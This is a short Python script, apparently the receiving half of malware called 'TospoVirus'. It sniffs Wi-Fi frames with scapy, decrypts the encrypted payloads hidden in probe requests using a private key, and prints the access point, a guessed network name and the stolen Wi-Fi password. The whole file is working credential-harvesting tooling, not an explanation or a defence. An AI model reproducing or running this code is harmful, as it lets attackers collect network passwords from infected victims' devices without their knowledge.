__author__ = 'catatonic'
"""
harvest.py:
    Identifies potential candidate packets for TospoVirus disclosed passwords.
"""

from scapy.all import *
import urllib
from subprocess import Popen
import difflib

ap_list = {}
def monitor(pkt):
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
        if pkt.addr2 not in ap_list and len(pkt.info) > 0:
            ap_list[pkt.addr2] = pkt.info
            print "adding: %s %s" %(pkt.addr2, pkt.info)
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4 and len(pkt.info) == 32:
	dec = Popen(['openssl', 'rsautl', '-decrypt', '-inkey', 'tvd.pem'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
	dec.stdin.write(pkt.info)
	dec.stdin.close()
	dec.wait()
        rc = dec.returncode
        if rc == 0:
            for close_match in difflib.get_close_matches(pkt.addr2, ap_list):
                print "AP: %s\t\tGuessed SSID: %s\t\tPass: %s" %(pkt.addr2, ap_list[close_match], dec.stdout.readline())

if len(sys.argv) < 2:
   print "Usage: sudo python harvest.py [monitor-iface]"
   exit()
conf.iface = sys.argv[1]
print '[*] Monitoring on %s' %(sys.argv[1])
sniff(prn=monitor, store=0)
